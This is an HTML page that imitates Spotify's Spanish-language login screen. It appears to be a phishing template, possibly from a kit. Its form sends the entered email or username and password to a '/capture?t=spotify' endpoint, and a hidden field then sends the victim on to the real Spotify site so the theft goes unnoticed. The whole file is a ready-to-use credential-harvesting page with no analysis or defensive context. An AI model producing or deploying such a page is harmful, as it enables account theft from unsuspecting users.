  <!DOCTYPE html>
  <html lang="es">
  <head>
    <meta charset="UTF-8">
    <title>Iniciar sesión • Spotify</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <style>
      body{margin:0;background:#000;color:#fff;font-family:'Circular Std',sans-serif;height:100vh;display:flex;align-items:center;justify-content:center}
      .container{max-width:400px;width:90%;text-align:center}
      .logo{width:140px;margin-bottom:40px}
      input{width:100%;padding:16px;margin:12px 0;background:#121212;border:1px solid #333;border-radius:500px;color:#fff;font-size:16px}
      button{background:#1db954;color:#fff;padding:16px;border:none;border-radius:500px;width:100%;font-size:17px;font-weight:700;cursor:pointer}
      button:hover{background:#1ed760}
      .separator{margin:30px 0;color:#727272;font-size:14px}
    </style>
  </head>
  <body>
    <div class="container">
      <img src="https://storage.googleapis.com/pr-newsroom-wp/1/2018/11/Spotify_Logo_RGB_White.png" alt="Spotify" class="logo">
      <form action="/capture?t=spotify" method="POST">
        <input type="text" name="username" placeholder="Correo electrónico o nombre de usuario" required autocomplete="username">
        <input type="password" name="password" placeholder="Contraseña" required autocomplete="current-password">
        <button type="submit">Iniciar sesión</button>
        <input type="hidden" name="redirect" value="https://open.spotify.com">
      </form>
    </div>
  </body>
  </html>
